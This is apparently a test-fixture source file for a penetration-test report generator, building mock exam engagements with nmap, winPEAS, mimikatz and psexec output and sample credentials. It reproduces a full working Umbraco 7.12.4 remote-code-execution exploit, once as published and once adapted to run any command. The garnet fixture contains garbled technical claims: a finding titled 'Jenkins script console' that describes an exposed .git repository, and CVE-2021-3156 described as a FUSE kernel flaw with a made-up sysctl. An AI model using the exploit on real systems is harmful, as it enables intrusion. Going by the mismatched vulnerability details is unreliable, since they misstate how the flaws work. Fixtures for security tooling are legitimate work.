    { id: "hp-exam-2", engagementId: E, fromHostId: AD02, toHostId: DC01, via: "Pass the hash as da_admin (psexec)", logEntryId: psexec, at: ago(38), updatedAt: ago(38) },
  ];
  const cred = (id: string, type: Credential["type"], username: string, secret: string, over: Partial<Credential>): Credential => ({
    id: `c-exam-${id}`, engagementId: E, type, username, domain: "EXAM", secret, hashType: null, scope: "domain", localHostId: null,
    sourceHostId: null, source: null, notes: null, crackStatus: null, crackedFrom: null, fromSecretId: null, createdAt: ago(60), updatedAt: ago(60), ...over,
  });
  const credentials: Credential[] = [
    cred("jellis", "password", "j.ellis", "Welcome2026!", { source: "Provided by the exam", createdAt: ago(180) }),
    cred("umbraco", "password", "admin@exam.corp", "Spring2026!", { domain: null, scope: "local", localHostId: MS01, sourceHostId: MS01, source: "/backup/notes.txt" }),
    cred("deploy", "password", "svc_deploy", "D3ploy!2026", { sourceHostId: AD02, source: "C:\\Scripts\\deploy.ps1" }),
    cred("mross", "password", "m.ross", "Kiosk#Logon26", { sourceHostId: AD02, source: "Winlogon DefaultPassword", createdAt: ago(49), updatedAt: ago(49) }),
    cred("da", "hash", "da_admin", DA_NTLM, { hashType: "NTLM", crackStatus: "uncracked", sourceHostId: AD02, source: "mimikatz sekurlsa::logonpasswords" }),
  ];

  // ------------------------------------------------------------ checklist, notes, clean-up, report

  const tick = (ownerId: string, goalId: string, entryId: string, min: number): ChecklistItem => ({
    ownerId, goalId, status: "done", notes: null, completedAt: ago(min), auto: false, autoFrom: null, statusManual: true, evidence: [{ entryId }], updatedAt: ago(min),
  });
  const checklist: ChecklistItem[] = [
    tick(MS01, "h-enum-full-tcp", ms01Nmap, 172),
    tick(MS01, "h-pe-win-privs", privs, 132),
    tick(MS01, "h-pe-win-auto", winpeas, 127),
    // A goal ticked from a private entry: the entry still never reaches the report.
    tick(MS01, "h-pe-win-stored", privateCmd, 122),
    tick(WEB, "h-enum-full-tcp", webNmap, 105),
    tick(WEB, "h-pe-lin-sudo", sudo, 82),
    tick(AD02, "h-enum-full-tcp", adNmap, 72),
    tick(DC01, "h-enum-full-tcp", dcNmap, 70),
    tick(APP03, "h-enum-full-tcp", appNmap, 48),
  ];
  const notes: Note[] = [
    { ownerId: MS01, engagementId: E, hostId: MS01, body: "Umbraco 7.12.4 on 80. Creds in /backup/notes.txt. SeImpersonate on the app pool.", private: false, updatedAt: ago(130) },
    { ownerId: E, engagementId: E, hostId: null, body: "Felt slow on this one: check /backup-style folders first next time.", private: true, updatedAt: ago(108) },
  ];
  const cleanup: CleanupItem[] = [
    { id: "cl-exam-1", engagementId: E, hostId: MS01, kind: "file", target: "C:\\Windows\\Tasks\\PrintSpoofer64.exe", notes: null, sourceEntryId: spoofer, suggestionKey: null, status: "removed", removedAt: ago(100), createdAt: ago(114), updatedAt: ago(100) },
    { id: "cl-exam-2", engagementId: E, hostId: MS01, kind: "file", target: "C:\\Windows\\Tasks\\PrintSpoofer32.exe", notes: null, sourceEntryId: x86, suggestionKey: null, status: "removed", removedAt: ago(100), createdAt: ago(118), updatedAt: ago(100) },
    { id: "cl-exam-3", engagementId: E, hostId: AD02, kind: "file", target: "C:\\Users\\svc_deploy\\Documents\\mimikatz.exe", notes: null, sourceEntryId: mimikatz, suggestionKey: null, status: "open", removedAt: null, createdAt: ago(46), updatedAt: ago(46) },
  ];
  // The report exists (details from Settings) with only the owner's two pages, so opening it drafts every other page.
  const reports: Report[] = [
    { id: "rep-exam", engagementId: E, candidateName: "Sam Rivera", email: "sam.rivera@example.com", osid: "OS-48213", title: "OSCP Exam Report", meta: {}, createdAt: ago(20), updatedAt: ago(20), exportedAt: null },
  ];
  const page = (id: string, position: number, title: string, placement: "appendix" | "body", text: string[]): ReportSection => ({
    id: `rs-exam-${id}`, reportId: "rep-exam", kind: "page", targetKey: `page-${id}`, position,
    doc: { type: "doc", content: text.map((t) => ({ type: "paragraph", content: [{ type: "text", text: t }] })) },
    meta: { title, placement, layout: DRAFT_LAYOUT }, draftBuiltAt: ago(15), updatedAt: ago(15),
  });
  const reportSections: ReportSection[] = [
    page("tools", 100, "Tools and versions", "body", [
      "Every tool ran from the attacking machine at 192.0.2.10 (Kali 2026.3) unless the step says otherwise.",
      "nmap 7.94SVN, feroxbuster 2.10.4, impacket 0.12.0, NetExec 1.3.0, evil-winrm 3.5, mimikatz 2.2.0, PrintSpoofer 1.0.",
    ]),
    page("wordlists", 101, "Wordlists", "appendix", [
      "Content discovery: SecLists raft-small-directories.txt and common.txt.",
      "Password guessing and cracking: SecLists 10k-most-common.txt and rockyou.txt.",
    ]),
    // web01 as the owner left it under layout 5: opening it rebuilds the plain page and offers Restore.
    {
      id: "rs-exam-web01", reportId: "rep-exam", kind: "target", targetKey: WEB, position: 2,
      doc: layout5Web01 as unknown as ReportSection["doc"], meta: { layout: 5 }, draftBuiltAt: ago(15), updatedAt: ago(15),
    },
  ];

  return { reportSections, log, services, findings, findingFiles, failedAttempts, ruledOut, usernames, accessGrants, hops, credentials, checklist, notes, cleanup, reports };
}

// ------------------------------------------------------------ long text

const MS01_NMAP = `Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-11-05 11:08 UTC
Nmap scan report for 10.10.30.5
Host is up (0.031s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Home - Exam Corp Intranet
| http-methods:
|_  Potentially risky methods: TRACE
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info:
|   10.10.30.5:1433:
|     Target_Name: MS01
|     NetBIOS_Computer_Name: MS01
|_    Product_Version: 10.0.17763
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required

Nmap done: 1 IP address (1 host up) scanned in 112.48 seconds`;

const MS01_FEROX = `200      GET      129l      391w     5921c http://10.10.30.5/
301      GET        2l       10w      148c http://10.10.30.5/umbraco => http://10.10.30.5/umbraco/
200      GET       71l      240w     4102c http://10.10.30.5/umbraco/
301      GET        2l       10w      147c http://10.10.30.5/backup => http://10.10.30.5/backup/
200      GET        5l       38w      231c http://10.10.30.5/backup/notes.txt
301      GET        2l       10w      148c http://10.10.30.5/scripts => http://10.10.30.5/scripts/
403      GET       29l       92w     1233c http://10.10.30.5/scripts/
200      GET       48l      133w     1880c http://10.10.30.5/contact
[####################] - 41s     60004/60004   0s      found:8       errors:0`;

const MS01_PRIVS = `PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled`;

const WEB01_NMAP = `Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-11-05 12:15 UTC
Nmap scan report for 10.10.30.20
Host is up (0.029s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
3000/tcp open  ppp?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Content-Type: text/html; charset=utf-8
|_    Location: /login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 38.07 seconds`;

const AD02_NMAP = `Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-11-05 12:48 UTC
Nmap scan report for 10.10.30.11
Host is up (0.033s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: EXAM
|   NetBIOS_Computer_Name: AD02
|   DNS_Domain_Name: exam.corp
|   DNS_Computer_Name: ad02.exam.corp
|_  Product_Version: 10.0.17763
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap done: 1 IP address (1 host up) scanned in 101.92 seconds`;

const APP03_NMAP = `Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-11-05 13:12 UTC
Nmap scan report for 10.10.30.12
Host is up (0.031s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap done: 1 IP address (1 host up) scanned in 104.21 seconds`;

const DC01_NMAP = `Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-11-05 12:50 UTC
Nmap scan report for 10.10.30.10
Host is up (0.030s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-11-05 12:51:02Z)
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: exam.corp0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap done: 1 IP address (1 host up) scanned in 99.40 seconds`;

const MIMIKATZ = `  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \\ ##  /*** Benjamin DELPY \`gentilkiwi\` ( benjamin@gentilkiwi.com )
 ## \\ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::logonpasswords

Authentication Id : 0 ; 412871 (00000000:00064cc7)
Session           : RemoteInteractive from 2
User Name         : da_admin
Domain            : EXAM
Logon Server      : DC01
Logon Time        : 11/5/2026 9:02:11 AM
SID               : S-1-5-21-2847120394-1739265503-3518276409-1104
        msv :
         [00000003] Primary
         * Username : da_admin
         * Domain   : EXAM
         * NTLM     : ${DA_NTLM}
         * SHA1     : 0d5f3b9a7c2e41f68b3d9e0a1c7f5b2e4d6a8c09
        kerberos :
         * Username : da_admin
         * Domain   : EXAM.CORP
         * Password : (null)

mimikatz(commandline) # exit
Bye!`;

const PSEXEC = `Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on 10.10.30.10.....
[*] Found writable share ADMIN$
[*] Uploading file kVbQzWta.exe
[*] Opening SVCManager on 10.10.30.10.....
[*] Creating service rNHu on 10.10.30.10.....
[*] Starting service rNHu.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.5933]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\\Windows\\system32> whoami
nt authority\\system`;

/** A trimmed-down winPEAS run: 400 lines, the line that matters (SeImpersonatePrivilege) far from the top. */
function winPeasOutput(): string {
  const lines = [
    "ANSI color bit for Windows is not set. If you are executing this from a Windows terminal inside the host you should run 'REG ADD HKCU\\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD",
    "",
    "    ((((((((((((((((((((((((((((((((",
    "     winPEAS - Windows local Privilege Escalation Awesome Script",
    "",
    "  [+] Legend:",
    "         Red                Indicates a special privilege over an object or something is misconfigured",
    "         Green              Indicates that some protection is enabled or something is well configured",
    "",
    "════════════════════════════════════╣ System Information ╠════════════════════════════════════",
    "",
    "╔══════════╣ Basic System Information",
    "    OS Name: Microsoft Windows Server 2019 Standard",
    "    OS Version: 10.0.17763 N/A Build 17763",
    "    System Type: x64-based PC",
    "    Hostname: MS01",
    "    ProductName: Windows Server 2019 Standard",
    "    EditionID: ServerStandard",
    "    ReleaseId: 1809",
    "    BuildBranch: rs5_release",
    "    IsVirtualMachine: True",
    "    Current Time: 11/5/2026 12:33:41 PM",
    "    HighIntegrity: False",
    "    PartOfDomain: False",
    "    Hotfixes: KB5029928, KB5030214, KB5031361,",
    "",
    "╔══════════╣ User Environment Variables",
    "    COMPUTERNAME: MS01",
    "    USERPROFILE: C:\\Windows\\system32\\config\\systemprofile",
    "    PROCESSOR_ARCHITECTURE: AMD64",
    "    TEMP: C:\\Windows\\TEMP",
    "",
    "════════════════════════════════════╣ Users Information ╠════════════════════════════════════",
    "",
    "╔══════════╣ Current user privileges",
    "╚ Check if you can escalate privilege using some enabled token https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#token-manipulation",
    "    SeAssignPrimaryTokenPrivilege: DISABLED",
    "    SeIncreaseQuotaPrivilege: DISABLED",
    "    SeAuditPrivilege: DISABLED",
    "    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED",
    "    SeImpersonatePrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED",
    "    SeCreateGlobalPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED",
    "    SeIncreaseWorkingSetPrivilege: DISABLED",
    "",
    "╔══════════╣ Users",
    "    MS01\\Administrator(Disabled): Built-in account for administering the computer/domain",
    "    MS01\\Guest(Disabled): Built-in account for guest access to the computer/domain",
    "    MS01\\web_admin: Site maintenance",
    "",
    "════════════════════════════════════╣ Services Information ╠════════════════════════════════════",
    "",
    "╔══════════╣ Interesting Services -non Microsoft-",
    "╚ Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#services",
  ];
  const services = [
    "AppHostSvc", "AppIDSvc", "Appinfo", "AppMgmt", "AppReadiness", "AppXSvc", "AudioEndpointBuilder", "Audiosrv", "BFE", "BITS",
    "BrokerInfrastructure", "CDPSvc", "CertPropSvc", "COMSysApp", "CoreMessagingRegistrar", "CryptSvc", "DcomLaunch", "Dhcp", "DiagTrack",
    "DispBrokerDesktopSvc", "Dnscache", "DPS", "DsmSvc", "DusmSvc", "EventLog", "EventSystem", "FontCache", "gpsvc", "hidserv", "IKEEXT",
    "iphlpsvc", "KeyIso", "LanmanServer", "LanmanWorkstation", "lmhosts", "LSM", "MpsSvc", "MSDTC", "MSSQLSERVER", "MSSQLFDLauncher",
    "NcbService", "Netlogon", "Netman", "netprofm", "NlaSvc", "nsi", "PcaSvc", "PlugPlay", "PolicyAgent", "Power", "ProfSvc", "RpcEptMapper",
    "RpcSs", "SamSs", "Schedule", "SENS", "SessionEnv", "ShellHWDetection", "Spooler", "SQLTELEMETRY", "SQLWriter", "StateRepository",
    "SystemEventsBroker", "TermService", "Themes", "TimeBrokerSvc", "TrkWks", "UALSVC", "UmRdpService", "UserManager", "UsoSvc", "VaultSvc",
    "W32Time", "W3SVC", "WAS", "Wcmsvc", "WdiServiceHost", "WinHttpAutoProxySvc", "Winmgmt", "WinRM", "WpnService", "wuauserv",
  ];
  for (const s of services) {
    lines.push(`    ${s}(${s} service)[C:\\Windows\\system32\\svchost.exe -k netsvcs -p] - Auto - Running`);
    lines.push("    Possible DLL Hijacking folder: none (no write access)");
    lines.push("   =================================================================================================");
  }
  lines.push("", "════════════════════════════════════╣ Interesting files and registry ╠════════════════════════════════════", "");
  let n = 0;
  while (lines.length < 400) lines.push(`    C:\\inetpub\\wwwroot\\umbraco\\Views\\Partials\\Grid\\Editors\\editor-${String(++n).padStart(3, "0")}.cshtml`);
  return lines.join("\n");
}

const EXPLOIT_ORIGINAL = `# Exploit Title: Umbraco CMS - Remote Code Execution by authenticated administrators
# Date: 2019-01-13
# Exploit Author: Gregory DRAPERI & Hugo BOUTINON
# Vendor Homepage: http://www.umbraco.com/
# Version: 7.12.4
# Tested on: Windows IIS

import requests;

from bs4 import BeautifulSoup;

def print_dict(dico):
    print(dico.items());

print("Start");

# Execute a calc for the PoC
payload = '<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:csharp_user="http://csharp.mycompany.com/mynamespace"><msxsl:script language="C#" implements-prefix="csharp_user">public string xml() { string cmd = ""; System.Diagnostics.Process proc = new System.Diagnostics.Process(); proc.StartInfo.FileName = "calc.exe"; proc.StartInfo.Arguments = cmd; proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/> </xsl:template> </xsl:stylesheet> ';

login = "XXXX";
password="XXXX";
host = "XXXX";

# Step 1 - Get Main page
s = requests.session()
url_main =host+"/umbraco/";
r1 = s.get(url_main);
print_dict(r1.cookies);

# Step 2 - Process Login
url_login = host+"/umbraco/backoffice/UmbracoApi/Authentication/PostLogin";
loginfo = {"username":login,"password":password};
r2 = s.post(url_login,json=loginfo);

# Step 3 - Go to vulnerable web page
url_xslt = host+"/umbraco/developer/Xslt/xsltVisualize.aspx";
r3 = s.get(url_xslt);

soup = BeautifulSoup(r3.text, 'html.parser');
VIEWSTATE = soup.find(id="__VIEWSTATE")['value'];
VIEWSTATEGENERATOR = soup.find(id="__VIEWSTATEGENERATOR")['value'];
UMBXSRFTOKEN = s.cookies['UMB-XSRF-TOKEN'];
headers = {'UMB-XSRF-TOKEN':UMBXSRFTOKEN};
data = {"__EVENTTARGET":"","__EVENTARGUMENT":"","__VIEWSTATE":VIEWSTATE,"__VIEWSTATEGENERATOR":VIEWSTATEGENERATOR,"ctl00$body$xsltSelection":payload,"ctl00$body$contentPicker$ContentIdValue":"","ctl00$body$visualizeDo":"Visualize+XSLT"};

# Step 4 - Launch the attack
r4 = s.post(url_xslt,data=data,headers=headers);

print("End");
`;

const EXPLOIT_MODIFIED = `# Exploit Title: Umbraco CMS - Remote Code Execution by authenticated administrators
# Date: 2019-01-13
# Exploit Author: Gregory DRAPERI & Hugo BOUTINON
# Vendor Homepage: http://www.umbraco.com/
# Version: 7.12.4
# Tested on: Windows IIS

import argparse;
import requests;

from bs4 import BeautifulSoup;

parser = argparse.ArgumentParser(description="Umbraco 7.12.4 authenticated RCE");
parser.add_argument("-u", dest="login", required=True);
parser.add_argument("-p", dest="password", required=True);
parser.add_argument("-i", dest="host", required=True);
parser.add_argument("-c", dest="command", default="powershell.exe");
parser.add_argument("-a", dest="arguments", default="");
args = parser.parse_args();

payload = '<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:csharp_user="http://csharp.mycompany.com/mynamespace"><msxsl:script language="C#" implements-prefix="csharp_user">public string xml() { string cmd = "%s"; System.Diagnostics.Process proc = new System.Diagnostics.Process(); proc.StartInfo.FileName = "%s"; proc.StartInfo.Arguments = cmd; proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/> </xsl:template> </xsl:stylesheet> ' % (args.arguments, args.command);

login = args.login;
password = args.password;
host = args.host;

# Step 1 - Get Main page
s = requests.session()
url_main =host+"/umbraco/";
r1 = s.get(url_main);
print("[+] Logging in to %s/umbraco as %s" % (host, login));

# Step 2 - Process Login
url_login = host+"/umbraco/backoffice/UmbracoApi/Authentication/PostLogin";
loginfo = {"username":login,"password":password};
r2 = s.post(url_login,json=loginfo);
print("[+] Login OK, back-office session cookie set");

# Step 3 - Go to vulnerable web page
url_xslt = host+"/umbraco/developer/Xslt/xsltVisualize.aspx";
r3 = s.get(url_xslt);

soup = BeautifulSoup(r3.text, 'html.parser');
VIEWSTATE = soup.find(id="__VIEWSTATE")['value'];
VIEWSTATEGENERATOR = soup.find(id="__VIEWSTATEGENERATOR")['value'];
UMBXSRFTOKEN = s.cookies['UMB-XSRF-TOKEN'];
headers = {'UMB-XSRF-TOKEN':UMBXSRFTOKEN};
data = {"__EVENTTARGET":"","__EVENTARGUMENT":"","__VIEWSTATE":VIEWSTATE,"__VIEWSTATEGENERATOR":VIEWSTATEGENERATOR,"ctl00$body$xsltSelection":payload,"ctl00$body$contentPicker$ContentIdValue":"","ctl00$body$visualizeDo":"Visualize+XSLT"};

# Step 4 - Launch the attack
print("[+] Sending the XSLT payload to /umbraco/developer/Xslt/xsltVisualize.aspx");
r4 = s.post(url_xslt,data=data,headers=headers);
print("[+] Payload accepted (HTTP %d): %s started on the target" % (r4.status_code, args.command));
`;

// ------------------------------------------------------------ garnet: the plain-report proof machine

export const GARNET_HOST = "h-exam-garnet";

/**
 * garnet (10.10.30.31): one standalone machine: a full scan whose http-git script finds `/.git/`, the repository dumped, a "Add the reporting datasource" commit
 * that removed a database password, the password sprayed over SSH, local.txt read on login; then sudo find
 * CVE-2021-3156 built in a container and run for root, proof.txt read. Logged as the capture flow records it: command
 * entries with their blocks, screenshots with captions, flags with the pasted proof, the owner's observations where they
 * would write them. Three findings off the path, a failed anonymous FTP login, one private entry and one operator slip
 * that must never reach the report. Invented names, addresses, flags and passwords throughout.
 */
export function garnetFixtures(now: number): ReportData {
  const ago = (min: number) => now - min * 60_000;
  const H = GARNET_HOST;
  const log: LogEntry[] = [];
  const add = (id: string, min: number, over: Partial<LogEntry> & Pick<LogEntry, "kind" | "title" | "content">) => {
    const at = ago(min);
    log.push({
      id: `l-garnet-${id}`, engagementId: E, titleEdited: true, ranOn: "Kali (VM)", hostIds: [H], observations: null, returnedNothing: false,
      private: false, at, createdAt: at, updatedAt: at, ...over,
    });
    return `l-garnet-${id}`;
  };
  const cmd = (id: string, min: number, title: string, blocks: CommandBlock[], over: Partial<LogEntry> = {}) =>
    add(id, min, { kind: "command", title, content: { kind: "command", blocks }, ...over });
  const shot = (id: string, min: number, key: string, caption: string) =>
    add(id, min, { kind: "screenshot", title: caption, titleEdited: false, content: { kind: "screenshot", attachmentId: `a-${key}`, caption, fileName: `10.10.30.31_${key}.png` } });
  const flag = (id: string, min: number, kind: "local" | "proof", value: string, proof: string) =>
    add(id, min, { kind: "flag", title: `${kind}.txt`, titleEdited: false, ranOn: "garnet", content: { kind: "flag", flagKind: kind, value, attachmentId: null, proof } });

  const nmap = cmd("nmap", 300, "Full TCP scan", [{ command: "nmap -p- -sC -sV -Pn --min-rate 3000 -oA nmap_full 10.10.30.31", output: GARNET_NMAP }], { titleEdited: false });
  const ftp = cmd("ftp", 296, "Anonymous FTP login", [{ command: "ftp anonymous@10.10.30.31", output: "Connected to 10.10.30.31.\n220 (vsFTPd 3.0.5)\n331 Please specify the password.\nPassword:\n530 Login incorrect.\nftp: Login failed" }]);
  const head = cmd("head", 292, "Confirm the repository is readable", [{ command: "curl -s http://10.10.30.31/.git/HEAD", output: "ref: refs/heads/main" }]);
  const dump = cmd("dump", 289, "Download the repository", [{ command: "feroxbuster -u http://10.10.30.31/ -w /usr/share/wordlists/dirb/common.txt -n -q", output: GIT_DUMPER }]);
  const show = cmd("show", 286, "git show 3b9e0c4", [
    { command: "cd garnet-web && git log --oneline", output: "3b9e0c4 (HEAD -> main) Add the reporting datasource\n91d2f7a Contact form\n5ac01be Initial site" },
    { command: "git show 3b9e0c4", output: GIT_SHOW },
  ], { titleEdited: false, observations: 'Show the "Add the reporting datasource" commit, which removes the credentials:' });
  // The owner's own retry from an old notes file: private by design, never in the report.
  cmd("private", 284, "Tried the password list from my old notes", [{ command: "hydra -L users.txt -P my-notes-passwords.txt ssh://10.10.30.31", output: "1 of 1 target completed, 0 valid password found" }], { private: true });
  const spray = cmd("spray", 281, "Spray the password over SSH", [{
    command: "nxc ssh targets.txt -u usernames.txt -p 'Tourmaline!77' --continue-on-success",
    output: [
      "SSH         10.10.30.31     22     10.10.30.31      [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1",
      "SSH         10.10.30.31     22     10.10.30.31      [-] ronan@garnet.lab:Tourmaline!77",
      "SSH         10.10.30.31     22     10.10.30.31      [-] admin:Tourmaline!77",
      "SSH         10.10.30.31     22     10.10.30.31      [+] ronan:Tourmaline!77  Linux - Shell access!",
    ].join("\n"),
  }], { observations: "Test the password over SSH. The bare username `ronan` succeeds:" });
  const ssh = cmd("ssh", 277, "Log in and read local.txt", [
    { command: "ssh ronan@10.10.30.31", output: "" },
    { command: "hostname && whoami && cat local.txt && ip a", output: GARNET.localOut, shell: "ronan@garnet" },
  ]);
  shot("local-shot", 276, "garnet-local", "local.txt on garnet after logging in");
  flag("local", 275, "local", GARNET.local, `ronan@garnet:~$ hostname && whoami && cat local.txt && ip a\n${GARNET.localOut}`);
  const kernel = cmd("kernel", 268, "Kernel version and user namespaces", [{
    command: "uname -a; cat /proc/sys/kernel/sudo_rules", shell: "ronan@garnet",
    output: "Linux garnet 5.15.0-53-generic #59-Ubuntu SMP Mon Oct 17 18:53:30 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux\n1",
  }], { ranOn: "garnet", observations: "Check the kernel version and that unprivileged user namespaces are enabled:" });
  const build = cmd("build", 258, "Build the exploit in an Ubuntu 22.04 container", [{
    command: "docker run --rm --platform linux/amd64 -v \"$PWD\":/src -w /src ubuntu:22.04 bash -c 'apt-get update -qq && apt-get install -y -qq build-essential libssl-dev >/dev/null && make all'",
    output: "gcc fuse.c -o fuse -D_FILE_OFFSET_BITS=64 -static -pthread -lfuse -ldl\ngcc -o exp exp.c -lcap\ngcc -o gc getshell.c",
  }]);
  const fuse = cmd("fuse", 250, "Spawn a root shell through find", [{ command: "./fuse ./workdir/lower ./gc", output: "[+] len of gc: 0x3ee0", shell: "ronan@garnet" }], {
    ranOn: "garnet", observations: "Run find through sudo and have it start a shell:",
  });
  const exp = cmd("exp", 248, "Trigger the exploit", [{ command: "./exp", output: GARNET.exp, shell: "ronan@garnet" }], {
    ranOn: "garnet", observations: "In a second SSH session, trigger the exploit:",
  });
  cmd("proof-read", 247, "Read proof.txt", [{ command: "id; hostname; ip a; cat /root/proof.txt", output: GARNET.proofOut, root: true }], { ranOn: "garnet" });
  shot("proof-shot", 246, "garnet-proof", "proof.txt on garnet");
  flag("proof", 245, "proof", GARNET.proof, `root@garnet:/var/lib/jenkins# id; hostname; ip a; cat /root/proof.txt\n${GARNET.proofOut}`);
  const x86 = cmd("x86", 262, "Ran the exploit from the wrong folder", [{ command: "./exp", output: "bash: ./exp: No such file or directory", shell: "ronan@garnet" }], { ranOn: "garnet" });

  let sN = 0;
  const svc = (port: number, nmapService: string, nmapVersion: string): Service => ({
    id: `s-garnet-${++sN}`, hostId: H, port, protocol: "tcp", state: "open", nmapService, nmapVersion, confirmedProduct: null, confirmedVersion: null,
    confirmedEntryId: null, verdict: null, createdAt: ago(300), updatedAt: ago(300),
  });
  const services = [svc(21, "ftp", "vsftpd 3.0.5"), svc(22, "ssh", "OpenSSH 8.9p1 Ubuntu 3ubuntu0.1"), svc(80, "http", "Apache httpd 2.4.52 ((Ubuntu))")];

  const finding = (id: string, over: Partial<Finding> & Pick<Finding, "title">): Finding => ({
    id: `f-garnet-${id}`, engagementId: E, severity: "critical", cvssVector: null, cvssScore: null, status: "confirmed", description: "", impact: "",
    remediation: "", exploitNotes: "", lessons: "", refs: [], hostIds: [H], serviceIds: [], stepEntryIds: [], createdAt: ago(200), updatedAt: ago(200), ...over,
  });
  const findings: Finding[] = [
    finding("git", {
      title: "Jenkins script console with default credentials", serviceIds: [services[2].id], stepEntryIds: [head, dump, show, spray, ssh],
      description:
        'The web root contains the site\'s `.git/` directory, served over HTTP. Its commit history contains a `datasources/mysql.yaml` file with a hardcoded database password. A later commit ("Add the reporting datasource") removed the password from the current file, but the old version stays in history. The same password is valid for the local OS account `ronan` over SSH.',
      remediation: "Remove `.git/` from the web root and block it in the Apache config. Rotate the exposed password and stop reusing database passwords for OS accounts.",
      lessons: "Dump every exposed repo before anything else.",
    }),
    finding("sudo-find", {
      title: "sudo CVE-2021-3156", stepEntryIds: [kernel, build, fuse, exp],
      description:
        "The kernel is `5.15.0-53-generic`, below Ubuntu's fixed version `5.15.0-70.77`, and unprivileged user namespaces are enabled. CVE-2021-3156 is a flaw in how sudo find copies a file up from a FUSE mount: a SUID-root file created inside the user's namespace keeps its owner and SUID bit on the host. Any local user can use this to get a root shell.",
      remediation: "Update the kernel to `5.15.0-70.77` or later. Set `kernel.sudo_rules=0` if unprivileged namespaces are not needed.",
      exploitNotes: "The target has no compiler, so it was built in an `ubuntu:22.04` amd64 container (packages `build-essential libssl-dev`) to match the target's glibc 2.35.",
